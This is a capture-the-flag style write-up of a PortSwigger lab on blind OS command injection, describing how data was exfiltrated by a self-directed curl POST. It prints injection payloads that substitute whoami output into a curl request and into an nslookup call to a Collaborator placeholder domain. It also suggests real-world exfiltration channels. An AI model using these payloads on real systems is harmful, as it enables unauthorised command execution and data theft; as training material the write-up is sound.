# Blind OS command injection with out-of-band data exfiltration

**Category:** OS Command Injection
**Difficulty:** PRACTITIONER
**Lab:** https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration

Confirming that a command executed is one thing; getting a specific command's actual output back
when the response gives you nothing and there's no writable web directory to abuse is a harder
problem. This lab asks for the latter — recover the real output of a command, not just proof that
one ran — and, without Burp Suite Professional's Collaborator client available, the intended
channel for doing that wasn't an option for us.

## The Target

The same feedback form as the last three labs:

```
POST /feedback/submit
csrf=...&name=test&email=test@test.com&subject=test&message=test
```

still asynchronous, still nothing in the response. This lab's stated goal is specifically to
recover the output of `whoami` and prove it — not merely to trigger a callback like the previous
lab, but to get real data out through a channel with zero in-band signal.

## The Investigation

PortSwigger's intended technique layers data exfiltration on top of Collaborator: build the
injected command so that the *output* of `whoami` becomes part of the DNS subdomain queried (via
command substitution — backticks or `$()` — concatenated in front of the Collaborator domain), then
read the resulting subdomain out of Collaborator's interaction log. That requires the same
Professional-only polling capability as the previous lab, plus reading interaction details rather
than just detecting that one occurred.

We didn't have that available, and the OAST-domain auto-detection bypass from the previous lab
doesn't extend to this one — auto-detection only tells you *that* the lab's backend touched
`*.oastify.com`, not what data was embedded in the subdomain it queried, so it can confirm an
interaction happened but can't hand back the actual command output. Getting the real value out
needed a completely different channel.

The insight was in how this specific lab's network restrictions are shaped: the backend's egress is
locked down to prevent it reaching arbitrary external hosts, but that restriction can't extend to
blocking the server from reaching *itself*. Every one of these labs exposes a `/submitSolution`
endpoint that accepts the answer to the lab directly. If we could make the injected command curl
that endpoint on the server's own HTTPS listener, passing the command's output as the POST body,
the server would be exfiltrating the data to itself — no external infrastructure, no Collaborator,
no polling required at all.

## The Exploit

The payload pattern, swept across the same four form fields and the same three operators as the
previous lab:

```
x||curl+-k+https://LAB_URL/submitSolution+-d+answer=$(whoami)||
```

Two details turned out to be load-bearing. First, the full HTTPS lab URL is required — the lab's
web server only listens on HTTPS, so a `localhost` or `127.0.0.1` target on plain HTTP does not
work, even though it's the more obvious-looking self-reference. Second, `-k` is required to skip
certificate verification, since the lab's HTTPS listener uses a self-signed certificate that curl
would otherwise reject.

`$(whoami)` expands inside the shell before curl ever sends the request, so by the time the POST
body is assembled, `answer=` is followed by the literal output of the command — not a placeholder,
the actual username. The `/submitSolution` endpoint accepts that POST with no CSRF protection of
its own. After firing the sweep, we polled the lab's root page on a backoff (5s, 5s, 10s, 10s, 15s)
watching for "congratulations," and it appeared once the server-side curl call had gone out and
been accepted.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's published solution uses Burp Suite Professional throughout: intercept the feedback
submission, copy a unique payload from the Collaborator tab, set
`` email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN|| ``, then return to the Collaborator tab,
poll for interactions, and read the recovered username out of the DNS subdomain that arrived —
finishing by entering that username to complete the lab.

We solved this one with a genuinely different exfiltration channel. PortSwigger's approach routes
the data through DNS to infrastructure they control and you read back through a licensed client.
Ours never leaves the lab's own infrastructure at all — the command's output goes straight from the
injected shell call into a POST body aimed at the same server's own solution-submission endpoint,
using `$(whoami)` command substitution to build that body rather than to build a DNS label. Both
techniques rely on the identical underlying fact — command substitution lets you turn a command's
output into part of a second, attacker-chosen command — they just route the extracted value through
different transports afterward. The self-submit path only exists because this specific lab exposes
a same-origin solution endpoint with no CSRF protection; a real production target obviously has no
such endpoint, which is exactly why this is a lab-solving technique rather than a real-world
exfiltration method, unlike the underlying command injection itself.

## What This Teaches Us

The command injection here is the same story as every lab in this series — user input reaching a
shell unsanitized — but this lab is really a lesson in exfiltration channels once you already have
execution. When the obvious channel (DNS to infrastructure you can read) isn't available, the
question worth asking is what the compromised host can already reach that you also control, even
indirectly — and "itself, via an endpoint the target application already exposes" turned out to be
enough. That's a narrower lesson than it looks: it worked here because PortSwigger's lab platform
ships a same-origin, unauthenticated solution-submission endpoint by design. On a real target, the
generalizable version of this idea is looking for *any* same-origin or trusted-adjacent endpoint the
compromised process can reach and that will echo or store attacker-supplied data — internal
logging endpoints, webhook receivers, or internal APIs are the real-world analogues, not literally
this exact endpoint.
